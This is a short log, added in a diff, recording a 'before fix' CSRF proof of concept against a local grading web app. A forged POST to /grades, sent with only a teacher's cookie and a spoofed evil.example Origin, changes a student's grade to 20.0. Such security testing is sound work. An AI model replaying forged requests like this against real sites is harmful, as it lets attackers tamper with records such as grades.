@@ -1,0 +1,17 @@
+# BEFORE FIX — CSRF, flaw #11 (local stack, http://localhost:8080)
+# Date: Thu Nov 19 09:49:52 CET 2026
+
+[teacher login prof.turing / teach123 -> teacher.jar]
+  login HTTP 302  (302 = success)
+
+[forged POST /grades with ONLY the cookie + spoofed Origin: http://evil.example]
+  body: note_id=10&grade=20&comment=Perfect work.
+  forged request HTTP 302  (302 = accepted, server never checked Origin)
+
+[eve login eve / evepw -> eve.jar, then read /dashboard]
+  grep eve /dashboard for Eve's Mathematics grade cell:
+    32:        <td>20.0</td>
+    34:        <td>Perfect work.</td>
+
+  => Eve's grade is now 20.0 with comment "Perfect work." — the forged
+     cross-site request was accepted on a valid cookie alone. That is flaw #11.
